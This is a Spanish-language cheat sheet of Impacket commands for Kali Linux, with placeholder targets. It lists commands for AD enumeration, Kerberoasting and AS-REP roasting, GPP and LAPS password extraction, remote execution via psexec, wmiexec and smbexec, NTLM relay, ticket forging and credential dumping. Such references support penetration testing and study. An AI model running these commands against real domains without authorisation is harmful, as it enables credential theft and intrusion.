## Impacket Scripts en Kali Linux

> ### Enumeración y Extracción de Credenciales

-   **impacket-DumpNTLMInfo**: Extrae información sobre NTLM de un objetivo.
    
    ```bash
    impacket-DumpNTLMInfo <IP>
    ```
    
-   **impacket-Get-GPPPassword**: Extrae contraseñas de Group Policy Preferences (GPP).
    
    ```bash
    impacket-Get-GPPPassword
    ```
    
-   **impacket-GetADComputers**: Obtiene información sobre computadoras en un dominio Active Directory.
    
    ```bash
    impacket-GetADComputers -dc-ip <IP_DC> -d <DOMINIO> -u <USUARIO> -p <CONTRASEÑA>
    ```
    
-   **impacket-GetADUsers**: Lista usuarios de Active Directory.
    
    ```bash
    impacket-GetADUsers -dc-ip <IP_DC> -d <DOMINIO> -u <USUARIO> -p <CONTRASEÑA>
    ```
    
-   **impacket-GetLAPSPassword**: Extrae contraseñas LAPS (Local Administrator Password Solution).
    
    ```bash
    impacket-GetLAPSPassword -dc-ip <IP_DC> -d <DOMINIO> -u <USUARIO> -p <CONTRASEÑA>
    ```
    
-   **impacket-GetNPUsers**: Extrae hashes de usuarios sin pre-autenticación en Kerberos.
    
    ```bash
    impacket-GetNPUsers <DOMINIO>/ -usersfile usuarios.txt -no-pass -dc-ip <IP_DC>
    ```
    
-   **impacket-GetUserSPNs**: Obtiene hashes Kerberos de Service Principal Names (SPN).
    
    ```bash
    impacket-GetUserSPNs -request -dc-ip <IP_DC> <DOMINIO>/<USUARIO>:<CONTRASEÑA>
    ```
    

> ### Ejecución Remota de Comandos

-   **impacket-psexec**: Ejecuta comandos en un sistema remoto utilizando SMB.
    
    ```bash
    impacket-psexec <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
    ```
    
-   **impacket-atexec**: Ejecuta comandos en un objetivo usando el programador de tareas.
    
    ```bash
    impacket-atexec <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP> whoami
    ```
    
-   **impacket-dcomexec**: Ejecuta comandos remotos a través de DCOM.
    
    ```bash
    impacket-dcomexec <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP> whoami
    ```
    
-   **impacket-smbexec**: Ejecuta comandos sin dejar archivos en el sistema.
    
    ```bash
    impacket-smbexec <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
    ```
    **impacket-wmiexec**: Ejecuta comandos a través de WMI en un sistema remoto.
    ```
    impacket-wmiexec <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
    ```

> ### Ataques de Relé NTLM

-   **impacket-ntlmrelayx**: Realiza ataques de relé NTLM en diferentes protocolos.
    
    ```bash
    impacket-ntlmrelayx -tf targets.txt -smb2support
    ```
    

> ### Herramientas de SMB

-   **impacket-smbclient**: Cliente SMB para interactuar con comparticiones.
    
    ```bash
    impacket-smbclient <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
    ```
    
-   **impacket-smbserver**: Levanta un servidor SMB en Kali.
    
    ```bash
    impacket-smbserver -smb2support <NOMBRE> <DIRECTORIO>
    ```
    
> ### Otros Scripts Relevantes

-   **impacket-addcomputer**: Agrega una máquina al dominio.
    
    ```bash
    impacket-addcomputer -dc-ip <IP_DC> -d <DOMINIO> -u <USUARIO> -p <CONTRASEÑA>
    ```
    
-   **impacket-changepasswd**: Cambia la contraseña de un usuario en el dominio.
    
    ```bash
    impacket-changepasswd <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
    ```
    
-   **impacket-dacledit**: Modifica permisos de objetos en Active Directory.
    
    ```bash
    impacket-dacledit -dc-ip <IP_DC> -d <DOMINIO> -u <USUARIO> -p <CONTRASEÑA>
    ```
    
-   **impacket-describeTicket**: Analiza y describe tickets Kerberos.
    
    ```bash
    impacket-describeTicket <TICKET.KRB>
    ```
    
-   **impacket-getTGT**: Obtiene un Ticket Granting Ticket (TGT) de Kerberos.
    
    ```bash
    impacket-getTGT -dc-ip <IP_DC> <DOMINIO>/<USUARIO>:<CONTRASEÑA>
    ```
    
-   **impacket-getST**: Obtiene un Service Ticket (ST) para autenticación Kerberos.
    
    ```bash
    impacket-getST -dc-ip <IP_DC> -spn <SERVICIO>/<HOST> <DOMINIO>/<USUARIO>:<CONTRASEÑA>
    ```
    
-   **impacket-mimikatz**: Extrae credenciales de memoria con Mimikatz.
    
    ```bash
    impacket-mimikatz <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
    ```
    
-   **impacket-owneredit**: Modifica el propietario de un objeto en Active Directory.
    
    ```bash
    impacket-owneredit -dc-ip <IP_DC> -d <DOMINIO> -u <USUARIO> -p <CONTRASEÑA>
    ```
    
-   **impacket-rpcmap**: Mapea servicios RPC en un host.
    
    ```bash
    impacket-rpcmap <IP>
    ```
    
-   **impacket-ticketer**: Crea tickets Kerberos para ataques Pass-the-Ticket.
    
    ```bash
    impacket-ticketer -nthash <NTHASH> -domain <DOMINIO> -user <USUARIO>
    ```
    
-   **impacket-wmiquery**: Ejecuta consultas WMI en un host remoto.
    
    ```bash
    impacket-wmiquery <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
    ```
